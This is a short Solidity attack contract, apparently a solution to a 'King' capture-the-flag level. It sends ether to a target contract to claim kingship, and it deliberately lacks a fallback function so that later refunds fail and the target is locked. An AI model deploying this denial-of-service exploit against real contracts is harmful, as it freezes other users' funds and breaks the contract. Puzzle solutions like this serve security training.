// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHack {

  address payable kingContract;

  constructor(address _kingContractAdress) {
    kingContract = payable(_kingContractAdress);
  }

  function hack() public payable {
    kingContract.call{value: msg.value}("");
  }

  // Missing fallback fn is the key
}